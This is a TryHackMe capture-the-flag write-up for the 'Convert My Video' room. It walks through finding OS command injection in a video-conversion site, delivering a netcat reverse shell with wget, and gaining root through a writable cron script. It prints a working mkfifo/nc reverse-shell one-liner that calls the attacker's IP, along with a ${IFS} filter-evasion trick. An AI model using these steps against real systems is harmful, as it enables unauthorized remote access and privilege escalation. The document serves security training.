---
layout: post
title: "Convert My Video"
date: 2022-04-24
categories: [Tryhackme, Medium-THM]
tags: [security, web, ctf, challenge]
image: ../../assets/img/posts/ConvertMyVideo.png 

---

## Description

My Script to convert videos to MP3 is super secure.

|**Room**|[Internal](https://tryhackme.com/room/convertmyvideo)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Medium|
|**Creator**|[overjt](https://tryhackme.com/p/overjt)|

---

After deploying, we'll start with nmap scan,

```bash
sudo nmap -A -T4 -p- -oN nmap_scan 10.10.222.32
```

![image](https://user-images.githubusercontent.com/67465230/164979815-b3b03a39-3af5-456d-b9f0-9f58e1aa46f7.png)

We can see that 2 ports 22 (SSH) and 80 (HTTP) are open.

Let's visit http://10.10.222.32/,

![image](https://user-images.githubusercontent.com/67465230/164979819-4706dd39-296a-4607-8be8-f2a637a4fec4.png)

Looks like this is a sort of conversion site where one can convert video to mp3 and vice versa.

Now, let's brute force directories using gobuster tool,

```bash
gobuster dir -u http://10.10.222.32/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -q 2>/dev/null
``` 

![image](https://user-images.githubusercontent.com/67465230/164979820-c7b6f276-17f4-4e93-9ee6-a90cc9c052da.png)

We can see that it has **/admin** as secret directory. Now, we'll visit to admin path, this window poppup will occur,

![image](https://user-images.githubusercontent.com/67465230/164979821-917162c3-a141-4a00-990c-086f16a06748.png)

It wants us to give username and password to get authenticated. We don't have credentials. So it'll give this message,

![image](https://user-images.githubusercontent.com/67465230/164979823-5932ef68-e8d5-4491-bb9b-68dae1ca1c9f.png)

Now, we'll look for another method. 

Let's try to give some input in search tab on main page and we'll intercept the request using burpsuite,

![image](https://user-images.githubusercontent.com/67465230/164979833-c7189fec-17fa-48d8-b909-e6f78bdedfa6.png)

now, let's intercept request and send this to repeater,

![image](https://user-images.githubusercontent.com/67465230/164979839-07ad33d2-5dd9-4261-b3d7-8ab107d94cdc.png)

Repeater will give response to this request as much we'll modify this request,

![image](https://user-images.githubusercontent.com/67465230/164979842-ef558664-3b78-4984-af31-6ce84731f511.png)

It gives normal error message contain warning. Let's try another search but this time, we'll provide a number,

![image](https://user-images.githubusercontent.com/67465230/164979846-7b0abf2a-9115-4b02-b26a-fafc23121e87.png)

This time we'll provide number to see what happens,

![image](https://user-images.githubusercontent.com/67465230/164979849-afa3887c-60ee-4a9a-86b3-bcdd06cad59e.png)

we get different error this time. That means this is **OS Command Execution** vulnerability. 

Try to inject some commands in between **backticks** to see what we got as response but we don't get a response that we want instead, we'll get error. But when we type man command in between backticks, 

![image](https://user-images.githubusercontent.com/67465230/164979853-19a0bff7-48e1-4edc-8ec6-b17c744548f0.png)

We'll get this output,

![image](https://user-images.githubusercontent.com/67465230/164979856-d5961246-d5be-4b08-8993-cf5db1e308fd.png)

We got different response and "What manual page do you want" depicts that we've OS command execution vulnerability.

We'll try to get a netcat reverse shell using one-liner, the issue is that the command has some symbols in it that would actually break the injection,

![image](https://user-images.githubusercontent.com/67465230/164979859-c925791d-1f51-4e92-9a04-a4fe0f464a96.png)

So to prevent that, I've put this reverse shell into file called nc_shell on my local system,

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.189.151 4444 >/tmp/f
```

![image](https://user-images.githubusercontent.com/67465230/164979864-030dd639-7510-496c-82a4-b3957d539880.png)

and we'll upload this file using **wget**.

Starting python server to upload shell on machine, `python3 -m http.server` and type this syntax to upload the shell using **wget** command and make sure to replace " " with **"${IFS} "**  otherwise injection will break.

![image](https://user-images.githubusercontent.com/67465230/164979871-b555ee1f-f925-4842-aeaa-6b7420930ff1.png)

we'll get a response like this after uploading shell,

![image](https://user-images.githubusercontent.com/67465230/164979876-c4a11228-08a5-46a8-843f-58bbb7f22720.png)

Now, we'll start netcat listener on our machine, `nc -nvlp 4444` and now we'll execute the uploaded shell on burp,

![image](https://user-images.githubusercontent.com/67465230/164979880-63442333-5398-4500-ad2e-6fc4d2b5d11e.png)

after sending request, we'll get a reverse connection back on netcat listener.

![image](https://user-images.githubusercontent.com/67465230/164979884-529baa27-2fe9-4cfe-aefa-7a767a9e036e.png)

we're www-data user. That means we have shell.

we'll improve shell functionality,

```/bash
bin/bash -i
```

![image](https://user-images.githubusercontent.com/67465230/164979886-af2ebfa4-5c2a-4d4f-a5fb-0fa2a45ab0d3.png)

after doing ls we'll find that there are many directories present. And there's an **admin** directory present. Let's navigate to that and enumerating it,

![image](https://user-images.githubusercontent.com/67465230/164979889-62b93eaf-bc86-43d4-b87b-7ecba9be47c3.png)

let's view the content of htpasswd file,

![image](https://user-images.githubusercontent.com/67465230/164979892-ae2aad57-8633-4f0c-87ec-090602c5d68a.png)

Seems like these are creds for something. After tried everything, we can't crack this password.

Now, we've to do privilege escalation here. For this, we'll upload **pspy64s** file to monitor linux processes. 

![image](https://user-images.githubusercontent.com/67465230/164979895-b0f90ca3-efcc-4c66-b554-326286a3dc1b.png)

Now that the pspy64s file has been downloaded, we'll change it's execute permissions,

```bash
chmod +x pspy64s
```

Now, executing file, `./pspy64s` and after waiting sometime, we'll got to know what processes are running on the system,

![image](https://user-images.githubusercontent.com/67465230/164979898-cf8fb960-7e76-49f4-a34e-361dc800f59d.png)

and these are repeating on cycle. I wonder this is the work of CronJobs. 

Let's go to tmp folder,

![image](https://user-images.githubusercontent.com/67465230/164979904-124dfc3e-a7b6-4cc5-b9f5-63cc163b7cd7.png)

we found the binary there. Looks like is a scheduled task and runs frequently as root. It’s a shell file which is scheduled to run regularly as root and ‘www-data’ (current user) is the owner. You can modify the file to do anything you like as root == PrivEsc!

Append file with a command to cat out /root/root.txt and pass output to a file that we can access,

```bash
echo 'cat root/root.txt > root_flag' >> clean.sh
```

Wait for sometime to let the script execute. It tooks a while to get root_flag,

![image](https://user-images.githubusercontent.com/67465230/164979910-f6245668-258b-4f2c-a6c8-872dbff96e6d.png)

and we've our root flag.